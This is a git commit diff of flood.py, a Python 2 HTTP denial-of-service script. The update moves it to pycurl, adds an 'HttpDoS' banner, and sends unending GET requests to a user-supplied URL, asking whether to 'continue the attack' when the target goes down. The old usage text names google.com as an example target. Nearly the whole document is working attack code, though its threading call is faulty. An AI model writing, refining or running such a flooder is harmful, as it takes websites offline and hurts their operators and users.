e70a9fc137beaf6515f8e13f8801f6a503a583bc
unknwhp <36249329+unknwhp@users.noreply.github.com>
2018-03-28 17:21:14 -0300

    Update flood.py

--- flood.py
+++ flood.py
@@ -1,29 +1,54 @@
-import requests, sys, time, platform, os
-from os import _exit
-counter = 0
-init = time.time()
-def cls():
+try:
+    from thread import start_new_thread
+    import pycurl, sys, platform, os
+    from StringIO import StringIO
+except ImportError:
+    print 'Please install the module "pycurl"'
+    exit()
+def clear():
     if platform.system() == 'Windows':
         os.system('cls')
     else:
         os.system('clear')
-def info(): # Show the user time expended on flood attack
-    end = time.time()
-    total = int(end - init)
-    print '\n\n[*] Attack time: %i seconds' % total
-cls()
-if len(sys.argv) >= 3: # verify argumentes
-    host = sys.argv[1]
-    port = sys.argv[2]
-    while 1: # start the flood
+banner = ''' _   _ _   _         ____       ____  
+| | | | |_| |_ _ __ |  _ \  ___/ ___| 
+| |_| | __| __| '_ \| | | |/ _ \___ \ 
+|  _  | |_| |_| |_) | |_| | (_) |__) |
+|_| |_|\__|\__| .__/|____/ \___/____/ 
+              |_|                     '''
+if len(sys.argv) >= 2:
+    url = sys.argv[1]
+    clear()
+    print banner+'\n'
+    if url.startswith('http'):
+        pass
+    else:
+        url = 'http://'+url
+else:
+    print 'Usage: %s <url>' % sys.argv[0].split('\\')[len(sys.argv[0].split('\\')) -1]
+    exit()
+c = pycurl.Curl()
+buffer = StringIO()
+c.setopt(c.URL, url)
+c.setopt(c.WRITEDATA, buffer)
+def flood(counter):
+    while 1:
         try:
-            counter += 1
-            requests.get('http://'+host+':'+port) # >>> send get request to target
-            sys.stdout.write('\r[+] Sending request '+str(counter)+' to '+host+':'+port)
-        except KeyboardInterrupt: # Stop attack if user press (control + c)
-            info()
-            break
-else: # print correct usage
-    print '###############################\nUsage: %s <target> <port>' % (sys.argv[0].split("\\"))[::-1][0]
-    print 'Ex: %s google.com 80\n###############################' % (sys.argv[0].split("\\"))[::-1][0]
+            counter +=1
+            c.perform()
+            sys.stdout.write('\rSending request '+str(counter)+' to '+url)
+        except pycurl.error:
+            print '\nHost down or unavailable'
+            q = raw_input('Do you wanna continue the attack (y/n): ')
+            if q.lower() == 'y':
+                clear()
+                pass
+            else:
+                exit()
+try:
+    counter = 0
+    raw_input('Press Enter to Continue ...')
+    for i in xrange(5):
+        start_new_thread(flood(counter))
+except KeyboardInterrupt:
     exit()
